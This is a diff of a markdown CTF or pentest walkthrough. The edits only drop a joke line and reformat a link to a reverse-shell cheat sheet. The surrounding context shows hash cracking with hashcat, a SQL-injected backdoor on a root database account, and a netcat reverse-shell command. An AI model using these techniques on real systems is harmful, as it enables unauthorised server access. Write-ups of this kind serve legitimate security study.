@@ -256,8 +256,6 @@ $> hashcat -m 110 -a 0 ./pass.hash ./rockyou.txt
 
 Doesn't work
 
-Trying for all the users? Flemme
-
 #### Backdoor
 
 We are root on the database, we can try to inject some sql commands...
@@ -309,7 +307,7 @@ Our backdoor works
 
 Now we can try to inject a reverse shell for a prettier access to the server. The classic way use netcat with a command like `nc <address> <port> -e /bin/sh`. But in this server (ubuntu), the version of netcat doesn't support the `-e` option, so it will not work
 
-There is many options to get a reverse shell (create a socket, open port, link a shell to the socket...). There is a lot of exemples here  : asafety.fr/reverse-shell-one-liner-cheat-sheet
+There is many options to get a reverse shell (create a socket, open port, link a shell to the socket...). There is a lot of exemples [here](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/)
 
 We will do a python version because there is already python on the server. We use `pty` to spawn a shell because we need a tty shell (for `su` etc), better then just simple `bash` process like the exemples
 
